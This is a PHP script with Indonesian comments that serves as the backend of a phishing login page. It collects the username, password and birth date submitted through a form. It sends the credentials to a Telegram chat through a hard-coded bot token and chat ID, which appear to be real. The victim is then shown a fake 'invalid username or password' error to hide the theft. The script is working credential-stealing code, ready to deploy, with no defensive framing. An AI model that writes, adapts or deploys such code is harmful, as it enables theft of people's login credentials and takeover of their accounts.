<?php
// Ganti token_bot dan chat_id sesuai dengan informasi Telegram Anda
$token_bot = '6356869047:AAEEEmpcSPVJ0Jo6-E0Ba78OnnEEFHPmdwU';
$chat_id = '-1002031321163';

// Fungsi untuk mengirim pesan ke Telegram menggunakan cURL
function sendMessageToTelegram($message)
{
    global $token_bot, $chat_id;
    
    $url = "https://api.telegram.org/bot$token_bot/sendMessage";
    $data = array('chat_id' => $chat_id, 'text' => $message);

    $options = array(
        'http' => array(
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ),
    );

    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Mengambil data dari formulir
    $username = $_POST['username'];
    $password = $_POST['password'];
    $lahir = $_POST['lahir'];

    // Menyusun pesan untuk dikirim ke Telegram
    $message = "New Login Attempt:\n\n";
    $message .= "Username/Email/Phone: $username\n";
    $message .= "Password: $password\n";
    $message .= "Date: " . date("Y-m-d H:i:s");

    // Mengirim pesan ke Telegram
    sendMessageToTelegram($message);

    // Menampilkan pesan error kepada pengguna
    echo json_encode(array('error' => 'Invalid username or password. Please try again.'));
} else {
    // Jika akses langsung ke file ini tanpa melalui formulir, redirect ke halaman utama atau halaman error
    header("Location: index.html"); // Ganti dengan halaman yang sesuai
    exit();
}
?>
